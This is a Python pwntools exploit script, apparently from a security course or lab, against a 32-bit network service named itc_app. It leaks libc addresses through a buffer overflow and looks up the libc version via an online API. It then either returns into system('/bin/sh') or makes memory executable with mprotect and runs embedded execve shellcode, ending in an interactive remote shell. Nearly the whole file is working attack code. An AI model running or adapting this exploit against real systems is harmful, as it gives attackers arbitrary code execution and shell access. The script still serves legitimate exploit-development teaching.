import requests
import json
from pwn import *
import argparse

remoteIp = '192.168.0.155'
remotePort = 9000
conn = remoteIp
port = remotePort

outputLines_b = 6
outputLines_a = 2
arch = 4

leakNo = 30
leakDelim = b"Welcome"
useShellcode = True
writeToStack = False
# 21 bytes execve('/bin/sh') shellcode from https://shell-storm.org/shellcode/files/shellcode-841.html (Bem, 2013)
shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

static = "./itc_app"

headers1 = {'Content-Type': 'application/json'}
headers2 = headers1
# (Baumstark, 2020)
findLibcUrl = 'https://libc.rip/api/find'
libcSearchUrl = "https://libc.rip/api/libc/"
redirectStdErr = True

# Check if reverse shell was spawned then handle user input and output for the process
def handleReverseShell():
    # Check if shell was sucessfully executed
    noEOF = True
    try:
        proc.sendline(b"whoami"+b" 2>&1")
        print(proc.recv(timeout = 0.1).decode('utf-8'))
    except EOFError:
        noEOF = False

    # Create terminal input with option to automatically redirect stderr to stdout
    commandModifier = b""
    if redirectStdErr:
        commandModifier = b" 2>&1"
    while noEOF:
        command = input("$ ")
        try:
            proc.sendline((command).encode('utf-8')+commandModifier)
            print(proc.recv(timeout = 0.2).decode('utf-8'))
        except EOFError:
            return 200
    # If EOF found return 300
    return 300

# Leak randomised libc address via puts' PLT and function's GOT
def leakViaPuts(conn, port,putOutAddr, msg="puts"):
    global proc

    # Open process, assuming conn is an IP if port specified
    if port!=-1:
        proc = remote(conn,port)
    else:
        proc = process(conn)

    # Create different payloads if 64bit specified
    ## 64 bit doesn't work as it requires knowing the location of a pop rdi; ret rop gadget in the binary and prepending it
    if arch == 8:
        pltPutsBytes = p64(pltPuts)
        mainAddrBytes = p64(mainAddr)
        putOutAddrBytes = p64(putOutAddr)

    else:
        pltPutsBytes = p32(pltPuts)
        mainAddrBytes = p32(mainAddr)
        putOutAddrBytes = p32(putOutAddr)
    
    # Create and send puts(*pltOutAddr) buffer overflow payload
    payload = flat(
        b'A' * buffSize, # Padding so the next bytes will overwrite the EIP
        pltPutsBytes,    # Overflowed function will execute puts PLT on return
        mainAddrBytes,   # pltPuts will execute main() on return to facilitate subsequent buffer overflows
        putOutAddrBytes  # The first argument to puts PLT
                         # Which is the GOT address provided which points to the randomised libc address of the function
    )
    
    proc.sendline(payload)

    # Skip 'outputLines_b' number of lines so the next read will be the leaked value
    for i in range(outputLines_b):
        try:
            proc.recvline()
        except EOFError:
            pass
    
    # Get the leaked address
    putsAddr = u32(proc.recv(4))

    # Skip 'outputLines_a' number of lines to make a cleaner output should the program need to read any more lines after
    for i in range(outputLines_a):
        try:
            proc.recvline()
        except EOFError:
            pass
    log.success("Leaked address of "+msg+": "+hex(putsAddr))
    return putsAddr

# WSL Ubuntu libc6_2.35-0ubuntu3.6_i386 offsets
#  putsOffset = 0x732a0
#  systemOffset = 0x48170
#  exitOffset = 0x3a460
#  binShOffset = 0x1bd0d5

# AppSRV libc6_2.23-0ubuntu11.3_i386 offsets
#  putsOffset = 0x5fcb0
#  systemOffset = 0x3adb0
#  exitOffset = 0x3adb0
#  binShOffset = 0x15bb2b

# Perform a return-to-libc attack executing system('/bin/sh')
def attemptR2Libc(putsOffset, systemOffset, exitOffset, binShOffset):
    # Leak randomised libc puts addr
    putsAddr = leakViaPuts(conn, port, gotPuts)

    # Get lib base addr using putsOffset
    libc_address = putsAddr - putsOffset
    log.success(f'LIBC base: {hex(libc_address)}')

    # Create different payloads if 64bit specified
    ## 64 bit doesn't work as it requires knowing the location of a pop rdi; ret rop gadget in the binary or libc and prepending it
    if arch == 8:
        systemBytes = p64(systemOffset+libc_address)
        exitBytes = p64(exitOffset+libc_address)
        binShBytes = p64(binShOffset+libc_address)
    else:
        systemBytes = p32(systemOffset+libc_address)
        exitBytes = p32(exitOffset+libc_address)
        binShBytes = p32(binShOffset+libc_address)
    
    # Create and send system('/bin/sh') buffer overflow payload
    payload = flat(
        b'B' * buffSize, # Padding so the next bytes will overwrite the EIP
        systemBytes,     # Overflowed function will execute system() on return
        exitBytes,       # system will execute libc's exit() on return
        binShBytes,      # system's first pararmter 
                         # Which is libc's '/bin/sh' offset making the function call system('/bin/sh')
    )
    proc.sendline(payload)
    log.success("Executed system('/bin/sh') overflow")

    # Ouput next lines so next recv will be the ouput of system('/bin/sh')
    for i in range(outputLines_a):
        print(proc.recv(timeout = 0.05))
    
    # Check if reverse shell was spawned then handle user input and output for the process
    return handleReverseShell()


# Perform a return-to-libc attack executing system('/bin/sh')
def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff, percpOff):
    # Leak randomised libc puts addr
    putsAddr = leakViaPuts(conn, port, gotPuts)

    # Get lib base addr using putsOffset
    libc_address = putsAddr - putsOffset
    log.success(f'LIBC base: {hex(libc_address)}')
    
    # If the user selects to write the shellcode to the stack then leak stack locations via creating a format string vulnerability
    if writeToStack:

        # Create different payloads if 64bit specified
        ## 64 bit doesn't work as it requires knowing the location of a pop rdi; ret rop gadget in the binary or libc and prepending it
        if arch == 8:
            printfBytes = p64(printfOff+libc_address)
            percPBytes = p64(percpOff+libc_address)
        else:
            printfBytes = p32(printfOff+libc_address)
            percPBytes = p32(percpOff+libc_address)
        
        # Create and send printf('%x') buffer overflow payload
        payload = flat(
            b'B' * buffSize, # Padding so the next bytes will overwrite the EIP
            printfBytes,     # Overflowed function will execute printf() on return
            mainAddr,        # printf will execute main() on return to facilitate subsequent buffer overflows
            percPBytes,      # printf's first pararmter 
                             # Which is libc's '%x' offset making the function call printf('%x') 
                             # Which is a format string vulnerability leaking the next value on the stack in hex
        )
        log.info("Leaking stack via printf(%x)")
        # Execute 'leakNo' number of stack leaks and find stack values
        stackVal = False
        try:
            for i in range(leakNo):
                # Send buffer overflow and leak value
                proc.sendline(payload)
                # Skip lines to get leak
                for i in range(outputLines_b-1):
                    proc.recvline(timeout = 0.05)
                
                # Store leaked value
                leakLine= proc.recvline(timeout = 0.05)
                #print(leakLine)
                leakedVal = leakLine.split(leakDelim)[0]

                # Return error if leaked value doesn't match format
                if len(leakedVal)==0:
                    return 100
                try:
                    if leakedVal!=b"(nil)":
                        int(leakedVal,16)
                except:
                    return 300
                
                ## Find a stack address by checking for an address located in the .text section 
                ## then the stack address should be the next leaked value

                # Ouput and save stack value if .text address found
                #print(b"Leaked Value: " + leakedVal)
                if stackVal:
                    log.success("Stack Value = "+(leakedVal).decode('utf-8'))
                    stackAddr = leakedVal
                    break

                # Check if address in .text (specifically matches the first 4 bytes of the mainAddress)
                if (leakedVal[:4]).decode("utf-8")==hex(mainAddr)[2:6]:
                    stackVal = True
        
        # Return error if program doesn't leak value
        except EOFError:
            return 300

        # Make sure shellcode isn't overwriting important values on the stack
        codeAddr = int(leakedVal,16)+132+buffSize+len(shellcode)
    
    # If the user doesn't want the shellcode on the stack, overwrite the start of libc with the shellcode,
    # this can be any memory address but the start of libc should be fine
    else:
        codeAddr = libc_address
    
    # Execute mprotect(&codeaddr, 0x21000, PROT_READ (0x1) | PROT_WRITE (0x2) | PROT_EXEC (0x4)) 
    # This allows the program to write to and execute the address found above
    #https://man7.org/linux/man-pages/man2/mprotect.2.html (Free Software Foundation, 2018)
    payload = flat(
        b'C' * buffSize,                # Padding so the next bytes will overwrite the EIP
        p32(mprotectOff+libc_address),  # Overflowed function will execute mprotect() on return
        mainAddr,                       # mprotect will execute main() on return to facilitate subsequent buffer overflows
        p32(codeAddr>>0xc<<0xc),        # mprotect's first pararmter, the start address where the memory protections are changed
                                        # Being the code address gained above with the last 3 bytes set to 0x00
        p32(0x21000),                   # mprotect's second pararmter, the number of bytes after that address to change protections on
                                        # With 0x21000 being sufficiently large as to make sure any shellcode can be executed
        p32(0x7)                        # mprotect's third pararmter, the protection value to change on those addresses
                                        # Which is Read-Write-Execute: PROT_READ (0x1) | PROT_WRITE (0x2) | PROT_EXEC (0x4) = 0x7
    )
    proc.sendline(payload)
    log.success(f"Changed protections for {hex(codeAddr>>0xc<<0xc)}-{hex((codeAddr>>0xc<<0xc)+0x21000)} to RWX with mprotect")

    # Write shellcode payload to the address found above now changed to be writeable and executable using gets(&codeAddr)
    # Then execute that shellcode upon return of that gets()
    payload = flat(
        b'D' * buffSize, # Padding so the next bytes will overwrite the EIP
        pltGets,         # Overflowed function will execute gets() on return
        codeAddr,        # gets will execute shellcode on return. This is the payload execution
        codeAddr         # The input to gets will be written to the address found above
    )
    proc.sendline(payload)
    log.success(f"Called gets({hex(codeAddr)}) with {hex(codeAddr)} as return addr")

    # Input shellcode to gets so it is written to 'codeAddr' and then executed on return
    payload = flat(
        b'\x90'*20,
        shellcode
    )
    proc.sendline(payload)
    log.success(f"Sent shellcode to {hex(codeAddr)} via gets")

    # Recieve output of previous overflows to clear stdout
    output = b""
    while True:
        try:
            currline = proc.recv(timeout = 0.2)
            if len(currline)==0:
                break
            output+=currline
        except:
            break
    #print(output)
    
    # Check if reverse shell was spawned then handle user input and output for the process
    return handleReverseShell()
    

# Get an array of all the potential libc versions that fit the puts and gets offsets provided
def findPotentialLibcs(putsAddr,getsAddr):
    data = {"symbols": {"puts": hex(putsAddr),"gets": hex(getsAddr)}}
    response = requests.post(findLibcUrl, headers=headers1, data=json.dumps(data))
    responseJson = response.json()
    log.success(f"Retrieved potential libc versions for puts: {hex(putsAddr)} and gets: {hex(getsAddr)}")
    return responseJson

# Using the user-specified libc ID get the library's json ouput
def getSpecificLibc(libId):
    # Request library using the 'id' key
    data = {"id":libId}
    response = requests.post(findLibcUrl, headers=headers1, data=json.dumps(data))
    responseJson = response.json()

    # Check if library was recieved properly
    if len(responseJson) == 0:
        log.failure(f"Failed to retrieve library {libId}")
    else:
        log.success(f"Retrieved library {libId}")
    return responseJson

# Find the offsets of functions and '/bin/sh' from the current libc json
def getLibcSymbolOffsets(libcJson):
    # Get the libc id to perform a more thorough search of functions
    libId = libcJson['id']
    libcUrl = libcSearchUrl+libId
    
    # Define extra symbols to retrieve from the database
    findSymbols = {"symbols": ["exit", "mprotect", "malloc", "memcpy"]}

    # Request symbols from the datatbase
    response = requests.post(libcUrl, headers=headers2, data=json.dumps(findSymbols))
    symbolJson = response.json()

    # Store the symbols into variables
    putsOff = symbolJson['symbols'].get('puts')
    systemOff = symbolJson['symbols'].get('system')
    exitOff = symbolJson['symbols'].get('exit')
    mprotectOff = symbolJson['symbols'].get('mprotect')
    printfOff = symbolJson['symbols'].get('printf')
    bin_shOff = symbolJson['symbols'].get('str_bin_sh')
    print()
    log.info("Trying offsets for libc version: "+libId)
    log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}, mprotect: {mprotectOff}, printf: {printfOff}")
    return putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff

# Find the offset of the string '%x' from the current libc json
def getPercXOff(libcJson):
    # Find the url to download the library binary
    libcUrl = libcJson['download_url']
    # Get the library binary bytes
    response = requests.get(libcUrl, headers=headers2)
    filebytes = response.content
    # Find and return the offset in the binary of '%x'
    offset = filebytes.find(b"%x\x00")
    log.success("%x offset in "+libcJson['id']+": "+hex(offset))
    return offset

# String to boolean converter is a modified version of: https://stackoverflow.com/a/43357954 (Maxim & dennlinger, 2021)
def str2bool(v, argname):
    if isinstance(v, bool):
        return v
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    elif v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        print("\nInvalid boolean value for "+ argname+"\n", file=sys.stderr)

# Only executed if ran directly
if __name__ == "__main__":
    buffSize = 132
    
    # Function offsets (these don't change due to PIE being disabled)
    pltPuts = 0x8048340
    pltGets = 0x08048330
    mainAddr = 0x804847b
    gotPuts = 0x80497ac
    gotGets = 0x80497a8
    
    putsAddr = leakViaPuts(conn,port,gotPuts)
    getsAddr = leakViaPuts(conn,port,gotGets,msg="gets")
    responseJson = findPotentialLibcs(putsAddr,getsAddr)

    percXOff = 0
    # Attempt to execute system('/bin/sh') using ret-to-libc on each potential libc version
    for item in responseJson:
        # Get the symbol offsets for the specific libc version
        putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff = getLibcSymbolOffsets(item)

        # Find the offset of '%x\x00' in libc to use in format string stack leaks (not needed if using only libc leak)
        if writeToStack:
            percXOff = getPercXOff(item)

        if not useShellcode:
            # Attempt to execute system('/bin/sh')
            retVal = attemptR2Libc(int(putsOff,16),int(systemOff,16),int(exitOff,16),int(bin_shOff,16))
        else:
            # Attempt to execute execve(/bin/sh) shellcode
            retVal = attemptR2Libc_shellcode(int(putsOff,16),int(mprotectOff,16),int(printfOff,16),percXOff)


        # Print exit message depending on the return value
        if retVal == 200:
            print("End of file recieved.")
            break
        else:
            log.failure(f"Recieved premature EOF")
            proc.close()
